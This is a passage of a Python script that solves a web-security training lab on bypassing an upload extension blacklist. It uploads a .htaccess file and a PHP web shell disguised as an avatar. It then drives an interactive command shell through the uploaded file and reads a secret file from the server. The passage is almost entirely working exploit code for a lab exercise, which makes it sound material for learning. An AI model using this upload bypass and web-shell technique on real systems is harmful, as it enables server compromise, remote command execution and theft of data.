...
parser = argparse.ArgumentParser(description='Solves the following Lab: Web shell upload via extension blacklist bypass')
...
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
files = {"avatar":('.htaccess', open("04_.htaccess", "rb"))}
...
files = {"avatar":('shell.php5', open("shell.php", "rb"))}
r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account/avatar", headers=headers, data={"csrf":csrf,"user":"wiener"}, files=files)

# START PSEUDOSHELL SESSION
command = ""
shell_user = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php5?command=whoami").text.split("\n")[0]
hostname = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php5?command=hostname").text.split("\n")[0]
while command != "solvechallenge":
    ...
    r = set(requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php5?command={command}").text.split("\n"))
    for i in r:
        print(i, sep="\n")

# SUBMIT SOLUTION
else:
    r = requests.get("https://" + lab.id + f".web-security-academy.net/files/avatars/shell.php5?command=cat /home/carlos/secret").text
    secret = r[:len(r)//2]
